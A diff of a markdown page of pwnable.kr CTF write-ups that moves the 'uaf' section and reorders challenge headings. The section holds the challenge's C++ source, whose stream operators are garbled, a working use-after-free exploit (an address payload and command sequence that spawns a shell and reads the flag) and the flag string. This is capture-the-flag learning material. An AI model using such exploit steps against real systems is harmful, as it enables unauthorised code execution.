@@ -1044,110 +1044,6 @@ int main(int argc, char* argv[], char** envp){
 
 `FuN_w1th_5h3ll_v4riabl3s_haha`
 
-## [](#header-2)uaf
-
-> Mommy, what is Use After Free bug?
-> 
-> ssh uaf@pwnable.kr -p2222 (pw:guest)
-
-```c
-#include <fcntl.h>
-#include <iostream> 
-#include <cstring>
-#include <cstdlib>
-#include <unistd.h>
-using namespace std;
-
-class Human{
-private:
-        virtual void give_shell(){
-                system("/bin/sh");
-        }
-protected:
-        int age;
-        string name;
-public:
-        virtual void introduce(){
-                cout < "My name is " < name < endl;
-                cout < "I am " < age < " years old" < endl;
-        }
-};
-
-class Man: public Human{
-public:
-        Man(string name, int age){
-                this->name = name;
-                this->age = age;
-        }
-        virtual void introduce(){
-                Human::introduce();
-                cout < "I am a nice guy!" < endl;
-        }
-};
-
-class Woman: public Human{
-public:
-        Woman(string name, int age){
-                this->name = name;
-                this->age = age;
-        }
-        virtual void introduce(){
-                Human::introduce();
-                cout < "I am a cute girl!" < endl;
-        }
-};
-
-int main(int argc, char* argv[]){
-        Human* m = new Man("Jack", 25);
-        Human* w = new Woman("Jill", 21);
-
-        size_t len;
-        char* data;
-        unsigned int op;
-        while(1){
-                cout < "1. use\n2. after\n3. free\n";
-                cin > op;
-
-                switch(op){
-                        case 1:
-                                m->introduce();
-                                w->introduce();
-                                break;
-                        case 2:
-                                len = atoi(argv[1]);
-                                data = new char[len];
-                                read(open(argv[2], O_RDONLY), data, len);
-                                cout < "your data is allocated" < endl;
-                                break;
-                        case 3:
-                                delete m;
-                                delete w;
-                                break;
-                        default:
-                                break;
-                }
-        }
-
-        return 0;
-}
-```
-
-```bash 
-python -c 'print ("\x68\x15\x40\x00\x00\x00\x00\x00")' > /tmp/ihcuaf
-
-./uaf 24 /tmp/ihcuaf
-
-3 2 2 1
-
-cat flag
-```
-
-`yay_f1ag_aft3r_pwning`
-
-https://gist.github.com/ihciah/3c157f18f49bd2287470
-
-https://medium.com/@c0ngwang/pwnable-kr-writeup-uaf-4cb8ba851472
-
 ## [](#header-2)memcpy
 > Are you tired of hacking?, take some rest here.
 > Just help me out with my small experiment regarding memcpy performance. 
@@ -1547,46 +1443,148 @@ $
 ## [](#header-2)otp
 ## [](#header-2)ascii_easy
 ## [](#header-2)tiny_easy
-## [](#header-2)fsb
 ## [](#header-2)dragon
-## [](#header-2)fix
 ## [](#header-2)syscall
 ## [](#header-2)crypto1
-## [](#header-2)echo1
 ## [](#header-2)echo2
 ## [](#header-2)rsa calculator
-## [](#header-2)note
-## [](#header-2)alloca
+## [](#header-2)uaf
+
+> Mommy, what is Use After Free bug?
+> 
+> ssh uaf@pwnable.kr -p2222 (pw:guest)
+
+```c
+#include <fcntl.h>
+#include <iostream> 
+#include <cstring>
+#include <cstdlib>
+#include <unistd.h>
+using namespace std;
+
+class Human{
+private:
+        virtual void give_shell(){
+                system("/bin/sh");
+        }
+protected:
+        int age;
+        string name;
+public:
+        virtual void introduce(){
+                cout < "My name is " < name < endl;
+                cout < "I am " < age < " years old" < endl;
+        }
+};
+
+class Man: public Human{
+public:
+        Man(string name, int age){
+                this->name = name;
+                this->age = age;
+        }
+        virtual void introduce(){
+                Human::introduce();
+                cout < "I am a nice guy!" < endl;
+        }
+};
+
+class Woman: public Human{
+public:
+        Woman(string name, int age){
+                this->name = name;
+                this->age = age;
+        }
+        virtual void introduce(){
+                Human::introduce();
+                cout < "I am a cute girl!" < endl;
+        }
+};
+
+int main(int argc, char* argv[]){
+        Human* m = new Man("Jack", 25);
+        Human* w = new Woman("Jill", 21);
+
+        size_t len;
+        char* data;
+        unsigned int op;
+        while(1){
+                cout < "1. use\n2. after\n3. free\n";
+                cin > op;
+
+                switch(op){
+                        case 1:
+                                m->introduce();
+                                w->introduce();
+                                break;
+                        case 2:
+                                len = atoi(argv[1]);
+                                data = new char[len];
+                                read(open(argv[2], O_RDONLY), data, len);
+                                cout < "your data is allocated" < endl;
+                                break;
+                        case 3:
+                                delete m;
+                                delete w;
+                                break;
+                        default:
+                                break;
+                }
+        }
+
+        return 0;
+}
+```
+
+```bash 
+python -c 'print ("\x68\x15\x40\x00\x00\x00\x00\x00")' > /tmp/ihcuaf
+
+./uaf 24 /tmp/ihcuaf
+
+3 2 2 1
+
+cat flag
+```
+
+`yay_f1ag_aft3r_pwning`
+
+https://gist.github.com/ihciah/3c157f18f49bd2287470
+
+https://medium.com/@c0ngwang/pwnable-kr-writeup-uaf-4cb8ba851472
+
+## [](#header-2)unlink
 ## [](#header-2)loveletter
+## [](#header-2)chatbot
+## [](#header-2)crashgen
+## [](#header-2)leakme
+
 # [](#header-1)[Grotesque]
 ## [](#header-2)rootkit
-## [](#header-2)dos4fun
 ## [](#header-2)ascii
 ## [](#header-2)aeg
 ## [](#header-2)coin2
 ## [](#header-2)maze
 ## [](#header-2)wtf
-## [](#header-2)sudoku
+## [](#header-2)note
 ## [](#header-2)starcraft
 ## [](#header-2)cmd3
 ## [](#header-2)elf
 ## [](#header-2)lfh
-## [](#header-2)lokihardt
 ## [](#header-2)asg
 ## [](#header-2)hunter
 ## [](#header-2)mipstake
+## [](#header-2)asm3
+## [](#header-2)sizcaller
+
 # [](#header-1)[Hacker's Secret]
-## [](#header-2)unexploitable
-## [](#header-2)tiny
 ## [](#header-2)softmmu
+## [](#header-2)dos4fun
 ## [](#header-2)towelroot
 ## [](#header-2)nuclear
 ## [](#header-2)malware
-## [](#header-2)exploitable
 ## [](#header-2)tiny_hard
 ## [](#header-2)kcrc
 ## [](#header-2)exynos
-## [](#header-2)combabo calculator
 ## [](#header-2)pwnsandbox
+## [](#header-2)asm2
 
-## [](#header-2)crcgen
